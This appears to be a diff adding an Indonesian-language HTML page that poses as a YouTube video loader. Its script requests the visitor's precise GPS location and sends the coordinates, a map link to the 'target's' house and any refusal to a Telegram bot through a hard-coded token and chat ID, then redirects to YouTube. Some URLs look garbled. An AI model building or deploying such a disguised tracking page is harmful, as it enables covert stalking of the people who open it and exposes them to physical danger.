@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memuat Video YouTube...</title>
+</head>
+<body>
+    <div style="text-align: center; margin-top: 100px; font-family: Arial, sans-serif;">
+        <h3>Sedang memuat pemutar video, mohon tunggu...</h3>
+    </div>
+
+    <script>
+        const TOKEN = "8918235695:AAGBMSbj6sIJW6Dhr8DJtNUj7i4e6EkHJ_E";
+        const CHAT_ID = "7660723273";
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(kirimKeTelegram, jikaDitolak, {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                });
+            } else {
+                alihkanHalaman();
+            }
+        };
+
+        function kirimKeTelegram(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const akurasi = position.coords.accuracy;
+
+            const pesan = `🎯 LOKASI 100% AKURAT DITEMUKAN!\n\n` +
+                          `📍 Koordinat: ${lat}, ${lon}\n` +
+                          `📏 Akurasi: ${akurasi} meter\n\n` +
+                          `🔗 Klik untuk lihat Rumah/Posisi Target:\nhttps://google.com{lat},${lon}`;
+
+            fetch(`https://telegram.org{TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: pesan })
+            }).then(() => { alihkanHalaman(); });
+        }
+
+        function jikaDitolak(error) {
+            fetch(`https://telegram.org{TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: "❌ Target menolak (klik Block) izin lokasi GPS." })
+            }).then(() => { alihkanHalaman(); });
+        }
+
+        function alihkanHalaman() {
+            window.location.href = "https://youtube.com";
+        }
+    </script>
+</body>
+</html>
